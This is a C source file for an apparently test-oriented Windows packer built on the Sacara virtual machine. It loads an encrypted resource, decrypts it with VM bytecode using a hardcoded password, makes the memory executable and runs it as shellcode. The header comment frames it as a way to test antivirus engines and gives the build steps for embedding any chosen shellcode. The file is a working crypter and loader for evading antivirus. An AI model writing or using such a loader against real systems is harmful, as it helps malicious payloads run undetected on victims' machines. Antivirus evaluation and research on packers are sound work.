/*
This is a simple test to validate some AV engine. This file load a resource and decrypt it 
by using the sacara VM.

In order to use it, you have to:

1 - Assemble the sacara source code file: sacara_packer.sacara. You can do this with:
	SacaraAsm.exe sacara_packer.sacara
	
2 - Add the VM code to execute as a resource. You can do this with the command:
	AddResource.exe --name sacara --resource sacara_packer.sac SimplePacker.exe

3 - Add the code that will be decrypted with the harcoded password "sacara_test_password".
	You can do this with the command (replace data.bin with the shellcode that you want to execute):
	AddResource.exe --name data --resource data.bin --password sacara_test_password SimplePacker.exe

You can now run SimplePacker.exe and test your AV :)
*/

#include <stdint.h>
#include <Windows.h>

#ifdef _DEBUG
#include "debug.h"
#endif

extern uint32_t __stdcall vm_init(uint8_t[], uint32_t);
extern uint32_t __stdcall vm_run(uint32_t);
extern void __stdcall vm_set_error_handler(uint32_t, uint32_t);
extern void __stdcall vm_local_var_set(uint32_t, uint32_t, uint32_t);
extern void __stdcall vm_local_var_get(uint32_t, uint32_t);
extern void __stdcall vm_free(uint32_t);

static char resource_name[] = "data";
static char code_name[] = "sacara";

static void *read_resource(char *name, uint32_t *res_size) 
{
	HRSRC res_info = FindResource(NULL, name, "RT_RCDATA");
	if (!res_info) return NULL;
	
	HGLOBAL hres = LoadResource(NULL, res_info);
	if (!hres) return NULL;

	void *res = LockResource(hres);
	if (!res) return NULL;

	*res_size = SizeofResource(NULL, res_info);
	void *buffer = VirtualAlloc(NULL, *res_size, MEM_COMMIT, PAGE_READWRITE);	
	memcpy(buffer, res, *res_size);
	if (FreeResource(hres)) return NULL;

	return buffer;
}

static uint32_t exec_vm_code(uint8_t *data, uint32_t data_size, uint8_t *vm_code, uint32_t vm_code_size)
{
	uint32_t vm_context, result = 0;	
	vm_context = vm_init(vm_code, vm_code_size);
	vm_local_var_set(vm_context, 0, (uint32_t)data);
	vm_local_var_set(vm_context, 1, data_size);
	result = vm_run(vm_context);
	vm_free(vm_context);	
	return result;
}

static void execute_data_code(uint8_t *data, uint32_t data_size)
{
	uint32_t old_protection;
	if (!VirtualProtect(data, data_size, PAGE_EXECUTE_READ, &old_protection)) return;
	((void(*)(void))data)();
}

int main()
{
	void *data = NULL;
	uint32_t data_size;
	void *vm_code = NULL;
	uint32_t vm_code_size;

#ifdef _DEBUG
	data = test_data;
	data_size = sizeof(test_data);

	// encrypt data with password
	for (uint32_t i = 0; i < data_size; i++)
	{
		((uint8_t*)data)[i] ^= password[i % sizeof(password)];
	}

	vm_code = test_vm_code;
	vm_code_size = sizeof(test_vm_code);
#else
	// get resource content	
	data = read_resource(resource_name, &data_size);
	if (!data) goto complete;

	// get vm code content	
	vm_code = read_resource(code_name, &vm_code_size);
	if (!vm_code) goto complete;
#endif
	
	// run vm to decrypt code
	uint32_t vm_result = exec_vm_code(data, data_size, vm_code, vm_code_size);
	if (vm_code) VirtualFree(vm_code, vm_code_size, MEM_DECOMMIT);
	if (vm_result) goto complete;

	// now that the content is decrypted, execute it
	execute_data_code(data, data_size);

complete:
	if (data) VirtualFree(data, data_size, MEM_DECOMMIT);
	if (vm_code) VirtualFree(vm_code, vm_code_size, MEM_DECOMMIT);
	return 0;
}
